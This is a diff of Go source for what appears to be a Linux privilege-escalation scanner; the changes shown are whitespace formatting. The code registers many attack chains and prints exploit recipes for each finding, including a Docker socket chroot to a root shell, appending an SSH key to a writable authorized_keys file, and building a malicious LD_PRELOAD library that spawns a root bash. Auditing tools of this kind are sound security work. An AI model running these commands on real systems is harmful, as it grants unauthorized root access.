@@ -26,39 +26,39 @@ func init() {
 	registeredChains = []AttackChain{
 		&WritableScheduledChain{},
 		&LDPreloadChain{},
-		&LdSoPreloadChain{},         // (#2)
+		&LdSoPreloadChain{}, // (#2)
 		&SGIDShadowChain{},
 		&WritableSSHKeysChain{},
 		&WritableSSHDirChain{},
 		&PtraceRootChain{},
 		&DockerSocketGroupChain{},
 		&DockerContainerEscapeChain{},
-		&WritablePATHSUIDChain{},    // (#1)
-		&SessionHijackChain{},       // (#4)
-		&WritableServiceChain{},     // (#3)
+		&WritablePATHSUIDChain{}, // (#1)
+		&SessionHijackChain{},    // (#4)
+		&WritableServiceChain{},  // (#3)
 		&CriticalFilePermissionsChain{},
 		&DangerousCapabilitiesChain{},
 		&NfsNoRootSquashChain{},
 		&PolkitDangerousRulesChain{},
-		&SuidWritableLibChain{},        // E4: SUID + Writable Library Path chain
-		&LogrotateRootChain{},          // E1: Logrotate → Root chain
-		&EnvFileRootChain{},            // E2: Systemd EnvironmentFile → Root chain
-		&PAMRootChain{},                // PAM Config / pam_exec / pam_env / .so hijack chain
-		&XAuthoritySessionChain{},      // X11 Session Hijack chain
-		&VulnerabilitiesKernelChain{},  // Kernel & Software CVE high reliability chain
-		&ServiceBlankAuthChain{},       // Unauthenticated local network service chain
-		&DBusPolicyRootChain{},         // D-Bus Policy bypass chain
-		&FilePermExploitChain{},        // Binary relative PATH hijack chain
-		&SystemdOverrideChain{},        // Systemd drop-in override chain
-		&ELFRPathChain{},               // SUID dynamic RPATH/RUNPATH hijack chain
-		&UdevRootChain{},               // Udev rule & event execution chain
-		&CronDirRootChain{},            // Cron directory permission drift chain
-		&ProcEnvTokenChain{},           // Process environment secret harvester chain
-		&PackageHookChain{},            // Package manager drop-in & hook execution chain
-		&LDNSSChain{},                  // Dynamic Linker & NSS library search chain
-		&ModprobeChain{},               // Modprobe kernel module execution chain
-		&CloudMetaChain{},              // Cloud IMDS & K8s ServiceAccount token chain
-		&VenvWrapChain{},               // Python virtualenv & wrapper script chain
+		&SuidWritableLibChain{},       // E4: SUID + Writable Library Path chain
+		&LogrotateRootChain{},         // E1: Logrotate → Root chain
+		&EnvFileRootChain{},           // E2: Systemd EnvironmentFile → Root chain
+		&PAMRootChain{},               // PAM Config / pam_exec / pam_env / .so hijack chain
+		&XAuthoritySessionChain{},     // X11 Session Hijack chain
+		&VulnerabilitiesKernelChain{}, // Kernel & Software CVE high reliability chain
+		&ServiceBlankAuthChain{},      // Unauthenticated local network service chain
+		&DBusPolicyRootChain{},        // D-Bus Policy bypass chain
+		&FilePermExploitChain{},       // Binary relative PATH hijack chain
+		&SystemdOverrideChain{},       // Systemd drop-in override chain
+		&ELFRPathChain{},              // SUID dynamic RPATH/RUNPATH hijack chain
+		&UdevRootChain{},              // Udev rule & event execution chain
+		&CronDirRootChain{},           // Cron directory permission drift chain
+		&ProcEnvTokenChain{},          // Process environment secret harvester chain
+		&PackageHookChain{},           // Package manager drop-in & hook execution chain
+		&LDNSSChain{},                 // Dynamic Linker & NSS library search chain
+		&ModprobeChain{},              // Modprobe kernel module execution chain
+		&CloudMetaChain{},             // Cloud IMDS & K8s ServiceAccount token chain
+		&VenvWrapChain{},              // Python virtualenv & wrapper script chain
 	}
 }
 
@@ -74,7 +74,7 @@ func RunIntelligenceEngine(report *models.ScanReport) {
 	// Run DFS Graph Analysis — search for ALL goal types
 	graph := BuildIntelligenceGraph(report)
 	startNode := fmt.Sprintf("user:%s", report.TargetUser)
-	
+
 	// Dynamically build goals list from discovered graph nodes
 	goals := []string{"goal:root", "goal:sudo", "goal:shadow", "goal:docker_group"}
 	for id := range graph.Nodes {
@@ -264,8 +264,10 @@ func RunIntelligenceEngine(report *models.ScanReport) {
 			formattedDesc := ""
 			for i, line := range lines {
 				line = strings.TrimSpace(line)
-				if line == "" { continue }
-				
+				if line == "" {
+					continue
+				}
+
 				if strings.Contains(line, "->") {
 					formattedDesc += "\n       " + ColorCyan + "→ " + ColorReset + line
 				} else {
@@ -277,7 +279,7 @@ func RunIntelligenceEngine(report *models.ScanReport) {
 			}
 			details["Path"] = formattedDesc
 		}
-		
+
 		PrintFinding(severity, res.Name, details, res.Exploit)
 	}
 }
@@ -464,10 +466,10 @@ func (c *WritableSSHKeysChain) Evaluate(report *models.ScanReport) []ChainResult
 			for _, netConn := range report.NetworkConnections {
 				if netConn.LocalPort == 22 && netConn.State == "LISTEN" {
 					results = append(results, ChainResult{
-						Name:        fmt.Sprintf("Writable authorized_keys for '%s' + SSH listening on :22", sshKey.TargetUser),
-						RiskLevel:   "100% CONFIRMED",
-						Exploit:     fmt.Sprintf("Append your public key to '%s' -> ssh %s@localhost", sshKey.Path, sshKey.TargetUser),
-						TargetPath:  sshKey.Path,
+						Name:       fmt.Sprintf("Writable authorized_keys for '%s' + SSH listening on :22", sshKey.TargetUser),
+						RiskLevel:  "100% CONFIRMED",
+						Exploit:    fmt.Sprintf("Append your public key to '%s' -> ssh %s@localhost", sshKey.Path, sshKey.TargetUser),
+						TargetPath: sshKey.Path,
 					})
 				}
 			}
@@ -486,10 +488,10 @@ func (c *WritableSSHDirChain) Evaluate(report *models.ScanReport) []ChainResult 
 			for _, netConn := range report.NetworkConnections {
 				if netConn.LocalPort == 22 && netConn.State == "LISTEN" {
 					results = append(results, ChainResult{
-						Name:        fmt.Sprintf("Writable .ssh/ dir for '%s' + SSH on :22", sshKey.TargetUser),
-						RiskLevel:   "100% CONFIRMED",
-						Exploit:     fmt.Sprintf("Create '%s/authorized_keys' with your pubkey -> ssh %s@localhost", sshKey.Path, sshKey.TargetUser),
-						TargetPath:  sshKey.Path,
+						Name:       fmt.Sprintf("Writable .ssh/ dir for '%s' + SSH on :22", sshKey.TargetUser),
+						RiskLevel:  "100% CONFIRMED",
+						Exploit:    fmt.Sprintf("Create '%s/authorized_keys' with your pubkey -> ssh %s@localhost", sshKey.Path, sshKey.TargetUser),
+						TargetPath: sshKey.Path,
 					})
 				}
 			}
@@ -543,9 +545,9 @@ func (c *DockerSocketGroupChain) Evaluate(report *models.ScanReport) []ChainResu
 	}
 	if hasDockerSocket || hasDockerGroup {
 		return []ChainResult{{
-			Name:        fmt.Sprintf("Docker socket accessible (group=%v, socket=%v)", hasDockerGroup, hasDockerSocket),
-			RiskLevel:   "100% CONFIRMED",
-			Exploit:     "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+			Name:      fmt.Sprintf("Docker socket accessible (group=%v, socket=%v)", hasDockerGroup, hasDockerSocket),
+			RiskLevel: "100% CONFIRMED",
+			Exploit:   "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
 		}}
 	}
 	return nil
@@ -561,9 +563,9 @@ func (c *DockerContainerEscapeChain) Evaluate(report *models.ScanReport) []Chain
 			for _, sock := range report.Sockets {
 				if strings.Contains(sock.Service, "docker") {
 					results = append(results, ChainResult{
-						Name:        "Docker socket mounted INSIDE container",
-						RiskLevel:   "100% CONFIRMED",
-						Exploit:     "docker run -v /:/host --rm -it alpine chroot /host sh → full host root",
+						Name:      "Docker socket mounted INSIDE container",
+						RiskLevel: "100% CONFIRMED",
+						Exploit:   "docker run -v /:/host --rm -it alpine chroot /host sh → full host root",
 					})
 				}
 			}
@@ -952,28 +954,28 @@ func (c *EnvFileRootChain) Evaluate(report *models.ScanReport) []ChainResult {
 		case "LD_PRELOAD":
 			exploit = fmt.Sprintf(
 				"# Compile a malicious shared library:\n"+
-				"  echo 'void __attribute__((constructor)) init(){setuid(0);setgid(0);system(\"/bin/bash\");}' > /tmp/evil.c\n"+
-				"  gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c\n"+
-				"# Inject into env file and trigger restart:\n"+
-				"  echo 'LD_PRELOAD=/tmp/evil.so' >> %s\n"+
-				"  systemctl restart %s  # or wait for reboot",
+					"  echo 'void __attribute__((constructor)) init(){setuid(0);setgid(0);system(\"/bin/bash\");}' > /tmp/evil.c\n"+
+					"  gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c\n"+
+					"# Inject into env file and trigger restart:\n"+
+					"  echo 'LD_PRELOAD=/tmp/evil.so' >> %s\n"+
+					"  systemctl restart %s  # or wait for reboot",
 				ef.EnvFilePath, ef.ServiceName,
 			)
 		case "PATH":
 			exploit = fmt.Sprintf(
 				"# Place a malicious binary shadowing a command the service calls:\n"+
-				"  cp /bin/bash /tmp/evil && chmod +s /tmp/evil\n"+
-				"# Prepend /tmp to PATH in the env file and trigger restart:\n"+
-				"  sed -i 's|^PATH=|PATH=/tmp:|' %s\n"+
-				"  systemctl restart %s  # or wait for reboot",
+					"  cp /bin/bash /tmp/evil && chmod +s /tmp/evil\n"+
+					"# Prepend /tmp to PATH in the env file and trigger restart:\n"+
+					"  sed -i 's|^PATH=|PATH=/tmp:|' %s\n"+
+					"  systemctl restart %s  # or wait for reboot",
 				ef.EnvFilePath, ef.ServiceName,
 			)
 		default:
 			exploit = fmt.Sprintf(
 				"# Inject LD_PRELOAD into the writable env file:\n"+
-				"  echo 'LD_PRELOAD=/tmp/evil.so' >> %s\n"+
-				"# Build evil.so: gcc -shared -fPIC -o /tmp/evil.so evil.c\n"+
-				"  systemctl restart %s  # or wait for service restart / reboot",
+					"  echo 'LD_PRELOAD=/tmp/evil.so' >> %s\n"+
+					"# Build evil.so: gcc -shared -fPIC -o /tmp/evil.so evil.c\n"+
+					"  systemctl restart %s  # or wait for service restart / reboot",
 				ef.EnvFilePath, ef.ServiceName,
 			)
 		}
@@ -993,8 +995,8 @@ func (c *EnvFileRootChain) Evaluate(report *models.ScanReport) []ChainResult {
 			RiskLevel: riskLevel,
 			Description: fmt.Sprintf(
 				"Service '%s' (unit: %s) loads environment from '%s' which is writable by the "+
-				"current user. Injecting LD_PRELOAD or PATH causes arbitrary code to execute "+
-				"as root the next time the service is restarted.",
+					"current user. Injecting LD_PRELOAD or PATH causes arbitrary code to execute "+
+					"as root the next time the service is restarted.",
 				ef.ServiceName, ef.ServiceFile, ef.EnvFilePath,
 			),
 			Exploit:    exploit,
